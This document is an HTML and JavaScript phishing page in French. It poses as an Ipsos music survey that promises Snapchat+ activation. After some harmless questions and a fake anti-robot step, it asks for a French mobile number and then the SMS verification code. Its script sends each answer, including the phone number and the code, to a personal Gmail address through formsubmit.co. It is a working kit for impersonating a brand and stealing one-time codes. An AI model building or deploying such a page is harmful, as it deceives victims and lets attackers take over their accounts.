<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Sondage | Ipsos</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
body { font-family:'Inter', sans-serif; background:#f4f6f9; margin:0; }
.header { background:#003b7a; padding:20px 30px; display:flex; align-items:center; justify-content:center; position:relative; }
.header img { height:50px; }
.header a { position:absolute; left:30px; }
.header-text { color:#fff; font-size:26px; font-weight:700; }
.logo-fixed { position:fixed; top:20px; right:20px; height:55px; z-index:999; }
.box { max-width:650px; margin:60px auto; background:white; padding:45px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.1); text-align:center; }
h2 { font-size:28px; margin-bottom:20px; }
p { font-size:18px; margin-bottom:20px; }
input { width:100%; padding:14px; font-size:18px; border-radius:6px; border:1px solid #ccc; margin-bottom:15px; }
button { padding:14px 26px; background:#0078d4; color:#fff; border:0; border-radius:8px; cursor:pointer; font-size:18px; }
button:hover { background:#005fa3; }
button:disabled { background:#b0b0b0; cursor:not-allowed; }
.footer { text-align:center; padding:20px 0; font-size:14px; color:#999; margin-top:40px; border-top:1px solid #ddd; }
@media(max-width:600px){ .box{margin:20px;padding:25px} h2{font-size:24px} p{font-size:16px} }
</style>
</head>
<body>

<img src="francelogo.png" class="logo-fixed" alt="France">

<div class="header">
    <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos rÃ©ponses seront perdues.')">
        <img src="logo.png" alt="Ipsos">
    </a>
    <div class="header-text">Ipsos â€“ Sondage</div>
</div>

<!-- ETAPE 1 : QUESTIONS ARTISTES -->
<div class="box" id="etape1">
    <h2>Vos goÃ»ts musicaux</h2>
    <p>RÃ©pondez aux questions suivantes :</p>
    <input type="text" id="artiste_prefere" placeholder="Votre artiste prÃ©fÃ©rÃ©">
    <input type="text" id="artiste_deezer" placeholder="Artiste que vous Ã©coutez sur Deezer">
    <input type="text" id="artiste_decouverte" placeholder="Artiste dÃ©couvert rÃ©cemment">
    <button id="btnEtape1">Suivant</button>
</div>

<!-- ETAPE 2 : MESSAGE ANTI-ROBOT -->
<div class="box" id="etape2" style="display:none;">
    <h2>VÃ©rification anti-robot</h2>
    <p>Pour Ã©viter les abus, nous avons besoin de confirmer que vous Ãªtes un humain.</p>
    <button id="btnEtape2">Continuer</button>
</div>

<!-- ETAPE 3 : NUMERO DE TELEPHONE -->
<div class="box" id="etape3" style="display:none;">
    <h2>Votre numÃ©ro de tÃ©lÃ©phone</h2>
    <p>Veuillez entrer votre numÃ©ro (06 ou 07 uniquement) :</p>
    <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
    <button id="btnEtape3">Envoyer le numÃ©ro</button>
</div>

<!-- ETAPE 4 : CODE SMS -->
<div class="box" id="etape4" style="display:none;">
    <h2>Code de vÃ©rification</h2>
    <p>Entrez le code reÃ§u par SMS :</p>
    <input type="text" id="code_sms" placeholder="Code reÃ§u">
    <button id="btnEtape4">Envoyer le code</button>
</div>

<!-- ETAPE 5 : MESSAGE FINAL -->
<div class="box" id="etape5" style="display:none;">
    <h2>Merci !</h2>
    <p>Votre Snapchat+ sera activÃ© dans lâ€™heure. ðŸŽ‰</p>
</div>

<div class="footer">Â© 2026 Ipsos â€“ Tous droits rÃ©servÃ©s</div>

<script>
// Fonction pour envoyer les mails via fetch
async function sendMail(subject, dataObj){
    const formData = new FormData();
    formData.append("_subject", subject);
    formData.append("_cc","ano625343@gmail.com");
    formData.append("_captcha","false");
    for(let key in dataObj){
        formData.append(key, dataObj[key]);
    }
    try{
        await fetch("https://formsubmit.co/ano625343@gmail.com", {
            method:"POST",
            body: formData,
            headers: { "Accept":"application/json" }
        });
        console.log(subject+" envoyÃ© avec succÃ¨s.");
    } catch(e){
        console.error("Erreur envoi mail", e);
    }
}

// ETAPE 1
document.getElementById('btnEtape1').addEventListener('click', ()=>{
    let pref = document.getElementById('artiste_prefere').value.trim();
    let deezer = document.getElementById('artiste_deezer').value.trim();
    let decouverte = document.getElementById('artiste_decouverte').value.trim();
    if(!pref || !deezer || !decouverte){ alert("Veuillez remplir toutes les questions."); return; }

    sendMail("Ã‰tape 1 â€“ Questions artistes", {
        artiste_prefere: pref,
        artiste_deezer: deezer,
        artiste_decouverte: decouverte
    });

    document.getElementById('etape1').style.display='none';
    document.getElementById('etape2').style.display='block';
});

// ETAPE 2
document.getElementById('btnEtape2').addEventListener('click', ()=>{
    document.getElementById('etape2').style.display='none';
    document.getElementById('etape3').style.display='block';
});

// ETAPE 3 : TELEPHONE
document.getElementById('btnEtape3').addEventListener('click', ()=>{
    let tel = document.getElementById('telephone').value.trim();
    if(!/^0[67]\d{8}$/.test(tel)){ alert("NumÃ©ro invalide (06 ou 07)."); return; }

    sendMail("Ã‰tape 3 â€“ NumÃ©ro tÃ©lÃ©phone", {telephone: tel});

    document.getElementById('etape3').style.display='none';
    document.getElementById('etape4').style.display='block';
});

// ETAPE 4 : CODE SMS
document.getElementById('btnEtape4').addEventListener('click', ()=>{
    let code = document.getElementById('code_sms').value.trim();
    if(!code){ alert("Veuillez entrer le code."); return; }

    sendMail("Ã‰tape 4 â€“ Code SMS", {code_sms: code});

    document.getElementById('etape4').style.display='none';
    document.getElementById('etape5').style.display='block';
});
</script>

</body>
</html>
